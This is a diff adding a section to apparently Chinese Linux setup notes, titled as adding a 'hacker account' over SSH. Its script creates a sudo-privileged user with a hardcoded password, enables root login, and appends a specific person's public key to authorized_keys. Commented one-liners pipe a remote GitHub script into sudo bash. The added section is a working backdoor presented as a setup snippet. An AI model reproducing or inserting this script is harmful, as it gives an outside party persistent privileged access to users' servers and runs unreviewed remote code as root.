@@ -309,6 +309,48 @@ chsh -s /bin/zsh
 which zsh && sed -i -- 's:/bin/ash:'`which zsh`':g' /etc/passwd
 ```
 
+### SSH 设置密钥登陆并添加 hacker account
+
+```shell
+#!/bin/bash
+# https://pastebin.com/raw/tVC393Yz
+# bash <(wget -qO- -o- https://raw.githubusercontent.com/WhaleFell/TGBot/main/exc.sh)
+# curl -sSL https://raw.githubusercontent.com/WhaleFell/TGBot/main/exc.sh | sudo /bin/bash
+
+if [[ $(id -u) -ne 0 ]]; then
+    echo "This script must be run as root."
+    exit 1
+fi
+
+if grep -q "^sudo:" /etc/group; then
+    useradd -m -s /bin/bash -G sudo wf
+else
+    useradd -m -s /bin/bash -G root wf
+fi
+
+echo "wf:lovehyy" | sudo chpasswd
+
+sed -i 's/^#Port 22/Port 22/' /etc/ssh/sshd_config
+sed -i 's/^#PermitRootLogin./PermitRootLogin yes/' /etc/ssh/sshd_config
+echo "AllowUsers wf" >>/etc/ssh/sshd_config
+echo "AllowUsers root" >>/etc/ssh/sshd_config
+sed -i 's/^#PubkeyAuthentication./PubkeyAuthentication yes/' /etc/ssh/sshd_config
+
+mkdir -p /home/wf/.ssh
+touch /home/wf/.ssh/authorized_keys
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ1Kf/T8lUOn67cvrTsVMONFbfYnFPvimwmx20LOYBemST9DIItRFTxAktZcPdcYak62eDabfO7oosr1OQnTNTwpUpQDkwZLf41KeY3p5ABg6RKCtkw0vYua0Q6kkf0wQcQnKKLwbub7NmXJXQzfLjv4uqQ6t0FRuj7tuKcW6EX7vqlFncghGYZgHGu8M76Eoq8mKFGlRLOECqIbdluCo/LK37vc3kwCgh8D5U6wN98fZ6t6TzAJ9Y/3kdLZVgPDtgxwa4DOjf2UV0n3IDcIv58dP6GQ1uZ6wqcfWMZawDMMyC5zbBbNGU6Sa8gWZYibAMrMQJ4+1Qsluis2QJwdJk/5gdOEzrMnxn/AKQakKvGYFT12krxT8OwT+ZTieCTD9d8whbn8xnI4l7tX4hprAX8rZ3hWgVQ3jYXR6Esd2buC+LzwJxMEe6PNx0vLOX2JvJp1ffRcuJ2bL5zU1CHqv0nDDlCgB+ueHcSPrcng+mmBx3N2te2UpxGZmdH68yHvc= whalefall9420@outlook.com" >>/home/wf/.ssh/authorized_keys
+
+if command -v systemctl >/dev/null 2>&1; then
+    systemctl restart sshd
+else
+    service ssh restart
+fi
+
+ip=$(curl -s http://cip.cc)
+echo "Public IP: $ip"
+```
+
 ## Docker
 
 ### 安装
